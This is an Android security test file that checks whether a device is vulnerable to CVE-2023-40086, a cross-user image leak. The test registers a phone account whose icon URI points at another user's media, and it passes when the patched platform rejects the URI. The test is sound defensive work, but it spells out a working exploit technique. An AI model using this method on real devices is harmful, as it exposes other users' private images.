/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_40086;

import static android.Manifest.permission.CREATE_USERS;
import static android.Manifest.permission.MODIFY_PHONE_STATE;
import static android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.android.compatibility.common.util.SystemUtil.runWithShellPermissionIdentity;
import static com.android.sts.common.SystemUtil.poll;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.content.ComponentName;
import android.content.ContentProvider;
import android.content.Context;
import android.content.pm.UserInfo;
import android.graphics.drawable.Icon;
import android.os.UserManager;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;

import androidx.test.runner.AndroidJUnit4;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.util.List;

@RunWith(AndroidJUnit4.class)
public class DeviceTest {

    @Test
    public void testPocCVE_2023_40086() {
        try {
            final Context context = getApplicationContext();

            // Check if the device is voice capable or not
            assume().withMessage("This device is not voice capable")
                    .that(context.getSystemService(TelephonyManager.class).isVoiceCapable())
                    .isTrue();

            // Check if the device supports multiple users or not
            final UserManager userManager = context.getSystemService(UserManager.class);
            assume().withMessage("This device does not support multiple users")
                    .that(userManager.supportsMultipleUsers())
                    .isTrue();

            // Get the user id of 'cve_2023_40086_user'
            final int testUserId =
                    runWithShellPermissionIdentity(
                            () -> {
                                List<UserInfo> list = userManager.getUsers();
                                for (UserInfo info : list) {
                                    if (info.toString().contains("cve_2023_40086_user")) {
                                        return info.getUserHandle().getIdentifier();
                                    }
                                }
                                return -1;
                            },
                            CREATE_USERS);
            assume().withMessage("Unable to get userId of secondary user")
                    .that(testUserId)
                    .isNotEqualTo(-1);

            // PhoneAccount object is created using a phoneAccountHandle to registerPhoneAccount
            // with TelecomManager, which further leads to reproducing vulnerability.
            final PhoneAccountHandle testPhoneAccountHandle =
                    new PhoneAccountHandle(
                            new ComponentName(context, TestConnectionService.class),
                            "cve_2023_40086_id" /* id */);
            final PhoneAccount testPhoneAccount =
                    PhoneAccount.builder(testPhoneAccountHandle, "cve_2023_40086_label" /* label */)
                            .setIcon(
                                    Icon.createWithContentUri(
                                            ContentProvider.maybeAddUserId(
                                                    EXTERNAL_CONTENT_URI, testUserId)))
                            .setCapabilities(PhoneAccount.CAPABILITY_SELF_MANAGED)
                            .build();

            // Create instance of TelecomManager to registerPhoneAccount
            final TelecomManager telecomManager = context.getSystemService(TelecomManager.class);
            try {
                // Without fix, the PhoneAccount object gets registered successfully with the
                // invalid uri for icon.
                telecomManager.registerPhoneAccount(testPhoneAccount);
            } catch (IllegalArgumentException exception) {
                // With fix, IllegalArgumentException is raised when the userId in the uri does not
                // match the current userId.
                if (exception.getMessage().contains("icon belonging to another user")) {
                    return;
                } else {
                    throw exception;
                }
            }

            // Since 'testPhoneAccount' has been registered successfully, check whether icon uri
            // of 'testPhoneAccount' is corresponding to secondary user
            final boolean isPhoneAccountRegisteredWithIcon =
                    runWithShellPermissionIdentity(
                            () -> {
                                return poll(
                                        () -> {
                                            List<PhoneAccount> phoneAccounts =
                                                    telecomManager.getAllPhoneAccounts();
                                            for (PhoneAccount phoneAccount : phoneAccounts) {
                                                if (phoneAccount != null
                                                        && phoneAccount
                                                                .toString()
                                                                .contains(
                                                                        context.getPackageName())) {
                                                    return phoneAccount.getIcon() != null
                                                            && phoneAccount.getIcon().getUri()
                                                                    != null
                                                            && phoneAccount
                                                                    .getIcon()
                                                                    .getUri()
                                                                    .getUserInfo()
                                                                    .equals(
                                                                            Integer.toString(
                                                                                    testUserId));
                                                }
                                            }
                                            return false;
                                        });
                            },
                            MODIFY_PHONE_STATE);
            assertWithMessage(
                            "Device is vulnerable to b/296915211 !! Images can be revealed across"
                                    + " users via TelecomManager#registerPhoneAccount")
                    .that(isPhoneAccountRegisteredWithIcon)
                    .isFalse();
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }
}
